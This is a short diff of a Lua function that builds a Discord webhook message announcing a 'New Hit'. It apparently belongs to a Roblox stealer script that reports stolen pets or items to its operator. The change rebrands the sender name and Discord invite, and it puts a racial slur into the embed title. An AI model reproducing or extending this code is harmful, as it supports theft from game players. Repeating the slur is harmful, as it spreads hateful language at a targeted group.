@@ -1028,11 +1028,11 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://media.discordapp.net/attachments/736080557557022855/1140120484281856030/FB_IMG_1691312902228.jpg"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Rizz Scriptz",
+            ["username"] = "FuegoEterno Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Rizz||",
-                ["url"] = "https://discord.gg/uSgzNwHDTS",
+                ["title"] = "**New Hit** ||Nigger||",
+                ["url"] = "https://discord.gg/pUKMNeRwsn",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
